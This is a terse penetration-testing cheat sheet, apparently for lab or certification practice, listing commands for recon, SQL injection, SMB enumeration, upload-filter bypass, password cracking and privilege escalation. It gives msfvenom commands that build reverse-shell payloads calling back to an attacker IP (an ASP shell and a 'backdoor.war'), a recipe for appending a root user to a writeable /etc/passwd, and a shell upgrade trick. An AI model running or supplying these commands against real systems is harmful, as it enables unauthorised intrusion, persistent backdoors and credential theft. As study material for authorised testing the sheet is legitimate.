                -------------------------------
                ----- PENTEST CHEAT SHEET -----
                -------------------------------
***********
** RECON **
***********

  nmap -sV -sC -oA {filename} {remote_ip}
    -sV:              version scan
    -sC:              safe script scan
    -oA {filename}:   output in 3 formats in {filename} 

  dirb {http://remote_ip} -r -o {filename}
    -r:               don't do recursive search
    -o:               output in {filename}

  wpscan // wordpress

  droopescan // drupal

  curl -i {remote_ip} // check for http header

  nikto -host {remote_ip} // web vuln scanner
  
  MISC: 
    - check for virtual hosting
    - check html code for smth strange

  ssh user enumeration:
    https://www.exploit-db.com/exploits/45233

**********  
** SQLI **
**********  

  sqlmap -r login.req --level 5 --risk 3 --threads 20

*********
** SMB **
*********

  port 139, 445

  nmap --script smb-vuln* -p445 {remote_ip}

  msfconsole
    > use auxiliary/scanner/smb/smb_version // smb version detection

  enum4linux -a {remote_ip}

  smbclient -L //{remote_ip} // list smb shares
  OR
  smbmap -H {remote_ip} // gives shares permission
    // ADMIN$ and IPC$ are default shares

  smbclient //{remote_ip}/{share_name} -N // interactive smb shell

  **/!\** Check for rootfs symlink

  mount [-t cifs] //{remote_ip}/{share_name} /mnt/smb [-o vers=1.0]

*****************
** FILE UPLOAD **
*****************

  webdav upload with curl:
    curl -T ~/tools/bananes.jpeg http://{remote_ip}

  cadaver {remote_ip} // interact with webdav

  ASP payload
    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.80 LPORT=443 -f asp > shell.asp

  file upload filter:
    - php5, PHp, php.jpg, ...
    - mime type
    - ...

******************
** VULN SEEKING **
******************

  searchsploit "techno_to_look_at"
  
  MISC:
    - check for file upload

**************
** BINARIES **
**************

  strings -t x {binary}
    -t x:             print strings address in hex  

  binwalk

  steghide

  stegbrute
  
  MISC:
    - searchmem my_string in gdb to look for my_string
    - strings

******************
** POST EXPLOIT **
******************

  /dev/shm // writeable directory    

**************
** PRIV ESC **
**************

  find / -perm -4000 2>/dev/null

  sudo -l
    -l:               print the allowed commands for the invoking user

  MISC:
    - ch
    - openssl passwd --help // If /etc/passwd is writeable

  in case /etc/passwd is world writeable:
    - give hash of "foo"
    $ perl -le 'print crypt("foo", "aa")'
    aaKNIEDOaueR6

    - add toto user as root, with "foo" password
    $ echo toto:aaKNIEDOaueR6:0:0:toto:/root:/bin/bash >> /etc/passwd

    - login as toto:foo (with ssh for instance)

*********
** DNS **
*********

  nslookup
    > server {dns_ip} // change the dns server to be @dns_ip
    > @dns_ip // lookup name at @dns_ip

  dig axfr @dns_ip {dns_zone_name} // dns zone transfer

*******************
** GET PTY SHELL **
*******************

  python -c 'import pty; pty.spawn("/bin/sh");'
  ctrl-z
  stty raw -echo
  fg

******************
** IMG METADATA **
******************

  exiftool

****************
** BRUTEFORCE **
****************

  hydra // bruteforce given a user list and a pwd list
  cewl
  crunch // generate pw list

  unshadow passwd_file shadow_file > passwords.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

****************
** METASPLOIT **
****************

  tomcat
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.80 LPORT=443 -f war > backdoor.war

**********
** TODO **
**********

  add seclists (from github) on vm
  padBuster
